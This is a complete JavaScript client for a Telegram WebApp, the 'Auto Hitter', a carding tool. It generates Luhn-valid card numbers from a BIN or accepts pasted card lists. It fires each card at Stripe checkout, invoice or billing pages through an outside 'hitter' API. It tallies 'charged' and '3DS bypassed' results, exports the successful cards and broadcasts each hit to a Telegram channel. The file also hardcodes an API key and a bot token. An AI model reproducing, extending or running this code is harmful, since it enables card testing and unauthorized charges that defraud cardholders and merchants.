// Telegram WebApp Initialization
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.expand();
    tg.ready();
    tg.MainButton.hide();
}

// State
let activeGate = 'checkout';
let activeMode = 'cards';
let isHitting = false;
let currentOtp = null;
let currentChatId = null;

const API_KEY = 'hitchk_86d5f00d4d0078e7db5e4bc68322362f798d04e6ba20569d';
const API_URL = 'https://hitter1month.replit.app';
const NOTIFY_BOT_TOKEN = '8680374467:AAEcO6m-O6BOQD0mec7cyURfqQ8Ax2bphkk';
const NOTIFY_CHAT_ID = '-1003721268860';

// Authentication Check
function checkAuth() {
    // Auto-fill Chat ID from Telegram WebApp if available
    if (tg?.initDataUnsafe?.user?.id) {
        const loginChatIdInput = document.getElementById('loginChatId');
        if (loginChatIdInput && !loginChatIdInput.value) {
            loginChatIdInput.value = tg.initDataUnsafe.user.id;
        }
    }

    if (localStorage.getItem('isLoggedIn') === 'true') {
        document.getElementById('loginOverlay').classList.add('hidden');
        document.getElementById('app').classList.remove('blur');
    }
}
window.onload = checkAuth;

// Send OTP
document.getElementById('sendOtpBtn').addEventListener('click', async () => {
    const chatId = document.getElementById('loginChatId').value.trim();
    if (!chatId) { alert('Please enter your Chat ID'); return; }

    currentOtp = Math.floor(100000 + Math.random() * 900000).toString();
    currentChatId = chatId;

    const btn = document.getElementById('sendOtpBtn');
    btn.disabled = true;
    btn.innerText = 'Sending...';

    const message = `🔐 <b>Verification Code</b>\n\nYour OTP for Auto Hitter App is: <code>${currentOtp}</code>\n\nDon't share this code with anyone.`;

    try {
        const resp = await fetch(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const data = await resp.json();
        if (data.ok) {
            document.getElementById('loginStep1').classList.add('hidden');
            document.getElementById('loginStep2').classList.remove('hidden');
            if (tg) tg.HapticFeedback.notificationOccurred('success');
        } else {
            alert('Error: Make sure you have started @autohittrobot first!');
        }
    } catch (err) {
        alert('Failed to send code. Check your internet.');
    } finally {
        btn.disabled = false;
        btn.innerText = 'Send Verification Code';
    }
});

// Verify OTP
document.getElementById('verifyOtpBtn').addEventListener('click', () => {
    const inputCode = document.getElementById('loginCode').value.trim();
    if (inputCode === currentOtp) {
        localStorage.setItem('isLoggedIn', 'true');
        localStorage.setItem('userChatId', currentChatId);
        
        document.getElementById('loginOverlay').classList.add('hidden');
        document.getElementById('app').classList.remove('blur');
        
        if (tg) {
            tg.HapticFeedback.notificationOccurred('success');
            tg.showPopup({ message: 'Login Successful!' });
        }
    } else {
        alert('Invalid Code! Please check your Telegram.');
        if (tg) tg.HapticFeedback.notificationOccurred('error');
    }
});

// DOM Elements
const gateTabs = document.querySelectorAll('.gate-tab');
const modeBtns = document.querySelectorAll('.mode-btn');
const cardsInputSection = document.getElementById('cardsInputSection');
const binInputSection = document.getElementById('binInputSection');
const hitBtn = document.getElementById('hitBtn');
const hitBtnText = document.getElementById('hitBtnText');
const resultsList = document.getElementById('resultsList');
const successCard = document.getElementById('successCard');

// Stats Elements
const statTotal = document.getElementById('statTotal');
const statCharged = document.getElementById('statCharged');
const statBypassed = document.getElementById('statBypassed');

let stats = { total: 0, charged: 0, bypassed: 0 };
let chargedCards = [];

// Tab Switching
gateTabs.forEach(tab => {
    tab.addEventListener('click', () => {
        gateTabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        activeGate = tab.dataset.gate;
        if (tg) tg.HapticFeedback.selectionChanged();
    });
});

// Mode Switching
document.getElementById('modeCards').addEventListener('click', (e) => switchMode('cards', e.target));
document.getElementById('modeBin').addEventListener('click', (e) => switchMode('bin', e.target));

function switchMode(mode, btn) {
    activeMode = mode;
    modeBtns.forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    
    if (mode === 'cards') {
        cardsInputSection.classList.remove('hidden');
        binInputSection.classList.add('hidden');
    } else {
        cardsInputSection.classList.add('hidden');
        binInputSection.classList.remove('hidden');
    }
    if (tg) tg.HapticFeedback.selectionChanged();
}

// BIN Generation Logic
function generateLuhnCheckDigit(number) {
    let sum = 0;
    let shouldDouble = true;
    for (let i = number.length - 1; i >= 0; i--) {
        let digit = parseInt(number.charAt(i));
        if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
    }
    return (10 - (sum % 10)) % 10;
}

function generateCardsFromBin(bin, qty) {
    const cards = [];
    const cleanBin = bin.replace(/\D/g, '');
    
    // Detect Card Type Length
    // Amex (34, 37) = 15 digits
    // Others = 16 digits
    const isAmex = cleanBin.startsWith('34') || cleanBin.startsWith('37');
    const targetLength = isAmex ? 15 : 16;
    const baseLength = targetLength - 1;

    for (let i = 0; i < qty; i++) {
        let cardBase = cleanBin;
        while (cardBase.length < baseLength) {
            cardBase += Math.floor(Math.random() * 10);
        }
        // If the BIN is already longer than baseLength, truncate it to baseLength
        if (cardBase.length > baseLength) {
            cardBase = cardBase.substring(0, baseLength);
        }

        const checkDigit = generateLuhnCheckDigit(cardBase);
        const cardNum = cardBase + checkDigit;
        
        const mm = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
        const yy = Math.floor(Math.random() * (2032 - 2025) + 2025).toString().slice(-2);
        const cvv = String(Math.floor(Math.random() * 900) + 100);
        cards.push(`${cardNum}|${mm}|${yy}|${cvv}`);
    }
    return cards;
}

// Hitting Logic
hitBtn.addEventListener('click', async () => {
    // If already hitting, this button acts as 'STOP'
    if (isHitting) {
        isHitting = false;
        hitBtn.classList.remove('stop-btn');
        hitBtnText.innerText = 'Stopping...';
        return;
    }

    const url = document.getElementById('targetUrl').value.trim();
    if (!url) {
        alert('Please enter a target URL');
        return;
    }

    let cards = [];
    if (activeMode === 'cards') {
        const raw = document.getElementById('cardsTextarea').value.trim();
        cards = raw.split('\n').filter(c => c.trim().length > 0);
    } else {
        const bin = document.getElementById('binNumber').value.trim();
        const qty = parseInt(document.getElementById('binQuantity').value) || 10;
        if (!bin) { alert('Please enter a BIN'); return; }
        cards = generateCardsFromBin(bin, qty);
    }

    if (cards.length === 0) {
        alert('No cards to process');
        return;
    }

    // Start Process
    isHitting = true;
    hitBtn.classList.add('stop-btn');
    hitBtnText.innerText = 'STOP';
    resultsList.innerHTML = '';
    stats = { total: 0, charged: 0, bypassed: 0 };
    updateStatsUI();
    successCard.classList.add('hidden');

    for (let i = 0; i < cards.length; i++) {
        // Break loop if STOP was clicked
        if (!isHitting) break;

        const card = cards[i];
        const startTime = Date.now();
        
        try {
            const response = await fetch(`${API_URL}/hit/${activeGate}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-API-Key': API_KEY
                },
                body: JSON.stringify({
                    url: url,
                    card: card
                })
            });

            const result = await response.json();
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
            
            processHitResult(card, result, elapsed, i + 1, cards.length);

            // STOP IMMEDIATELY if hit is successful
            if (result.status === 'charged' || result.status === 'approved') {
                isHitting = false;
                break; 
            }
        } catch (err) {
            console.error(err);
            injectLog(card, 'error', 'Network Error or CORS', 0);
        }
    }

    isHitting = false;
    hitBtn.classList.remove('stop-btn');
    hitBtnText.innerText = 'Start Hitting';
    if (tg && tg.HapticFeedback && stats.charged > 0) tg.HapticFeedback.notificationOccurred('success');
});

function processHitResult(card, res, elapsed, count, total) {
    const status = res.status || 'dead';
    const message = res.message || 'Unknown Response';
    
    stats.total++;
    
    if (status === 'charged' || status === 'approved') {
        stats.charged++;
        chargedCards.push(card);
        showSuccessCard(card, res, count, total);
        sendHitToTelegram(card, res);
        if (tg) tg.HapticFeedback.notificationOccurred('success');
    } else if (status === '3ds_bypassed' || status === 'live') {
        stats.bypassed++;
    }

    injectLog(card, status, message, elapsed, res.bypassed_3ds);
    updateStatsUI();
}

function updateStatsUI() {
    statTotal.innerText = `${stats.total} total`;
    statCharged.innerText = `${stats.charged} Charged`;
    statBypassed.innerText = `${stats.bypassed} 3DS Bypassed`;
}

function showSuccessCard(card, res, count, total) {
    successCard.classList.remove('hidden');
    document.getElementById('successAmount').innerText = res.amount || 'Unknown';
    document.getElementById('successSite').innerText = res.site || 'Stripe Checkout';
    document.getElementById('successCardNum').innerText = maskCard(card);
    document.getElementById('successAttempts').innerText = `${count} / ${total}`;
}

function maskCard(card) {
    const parts = card.split('|');
    const num = parts[0];
    if (num.length < 10) return card;
    return `${num.substring(0,6)}******${num.substring(num.length-4)}|${parts[1]}|${parts[2]}|${parts[3]}`;
}

function injectLog(card, status, message, elapsed, bypassed3ds = false) {
    const isSuccess = (status === 'charged' || status === 'approved');
    const statusClass = isSuccess ? 'success' : 'decline';
    
    const div = document.createElement('div');
    div.className = 'log-item';
    
    div.innerHTML = `
        <div class="log-main">
            <span class="log-card">${maskCard(card)}</span>
            <span class="log-time">${elapsed}s</span>
        </div>
        <div class="log-status ${statusClass}">
            ${status === 'charged' ? '<i class="fas fa-shield-check"></i> ' : ''}
            ${message}
            ${bypassed3ds ? '<span class="log-badge bypassed">3DS BYPASSED</span>' : ''}
        </div>
    `;
    
    resultsList.prepend(div);
}

// Telegram Notification Logic
async function sendHitToTelegram(card, res) {
    const user = tg?.initDataUnsafe?.user;
    const userName = user ? `${user.first_name}${user.last_name ? ' ' + user.last_name : ''}` : 'Unknown User';
    
    // Format Gateway Name based on activeGate
    const gatewayMap = {
        'checkout': 'Stripe Checkout Hitter',
        'invoice': 'Stripe Invoice Hitter',
        'billing': 'Stripe Billing Hitter'
    };
    const gateway = gatewayMap[activeGate] || 'Stripe Hitter';

    const message = `
🔥 <b>HIT DETECTED</b> ⚡
👤 ${userName} [Gold]
↔️ <b>Gateway</b>: ${gateway}
✅ <b>Response</b>: Charged Successfully
🌐 <b>Site</b>: ${res.site || 'Unknown'}
💰 <b>Amount</b>: ${res.amount || 'Unknown'}
`.trim();

    try {
        await fetch(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: NOTIFY_CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "Open HIT Checker", url: "https://t.me/autohittrobot" }
                        ]
                    ]
                }
            })
        });
    } catch (err) {
        console.error('Failed to send telegram notification:', err);
    }
}

// Copy Charged
document.getElementById('copyBtn').addEventListener('click', () => {
    if (chargedCards.length === 0) return;
    const text = chargedCards.join('\n');
    navigator.clipboard.writeText(text).then(() => {
        alert('Charged cards copied to clipboard!');
    });
});
